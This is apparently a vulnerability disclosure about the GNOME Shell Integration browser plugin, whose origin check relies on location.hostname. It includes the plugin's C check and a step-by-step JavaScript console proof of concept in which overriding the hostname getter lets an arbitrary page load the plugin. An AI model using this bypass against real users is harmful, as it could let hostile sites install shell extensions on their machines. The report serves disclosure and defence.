While researching how to upgrade gnome 3 to version 2, I noticed it installed a browser extension called "Gnome Shell Integration".  $ rpm -qf /usr/lib64/mozilla/plugins/libgnome-shell-browser-plugin.so  The NPPVpluginDescriptionString states "It can be used only by extensions.gnome.org", but I happen to know that is a tricky thing to get right.    if (!funcs.getproperty (instance, NPVARIANT_TO_OBJECT (document),                           funcs.getstringidentifier ("location"),                           &location))     goto out;    if (!NPVARIANT_IS_OBJECT (location))     goto out;    hostname = get_string_property (instance,                                   NPVARIANT_TO_OBJECT (location),                                   "hostname");    if (g_strcmp0 (hostname, ORIGIN))     {       g_debug ("origin does not match, is %s",                hostname);        goto out;     }  I'm familiar with this topic as I wrote a tool for managing broken but necessary plugins by restricting them to trusted domains.  http://code.google.com/p/nssecurity  As far as I know, browsers only attempt to prevent tampering with document.location.href, anything else can be modified. For example, this works in Chrome, I don't know the syntax for Mozilla:  > location.__defineGetter__("hostname", function () { return "arbitrary"; })   undefined > location.hostname   "arbitrary"  However,    > location.__defineGetter__("href", function () { return "arbitrary"; })   undefined > location.href   "http://realurl.test/asdasd"  So this should fail:  > o = document.createElement('OBJECT')   <object>?</object>? > o.setAttribute('TYPE', 'application/x-gnome-shell-integration')   undefined > document.body.appendChild(o)   <object type=?"application/?x-gnome-shell-integration">?</object>? > o.shellVersion   undefined  But we can re-insert it and make it work:  > document.body.removeChild(o)   <object type=?"application/?x-gnome-shell-integration">?</object>? > location.__defineGetter__("hostname", function () { return "extensions.gnome.org"; })   undefined > document.body.appendChild(o)   <object type=?"application/?x-gnome-shell-integration">?</object>? > o.shellVersion   > document.location.href   "https://www.redhat.com/"  The plugin incorrectly trusted hostname, and initialized. As far as I can tell, the plugin will let you install new shell extensions, I don't know what the impact of that is, can they contain native code?
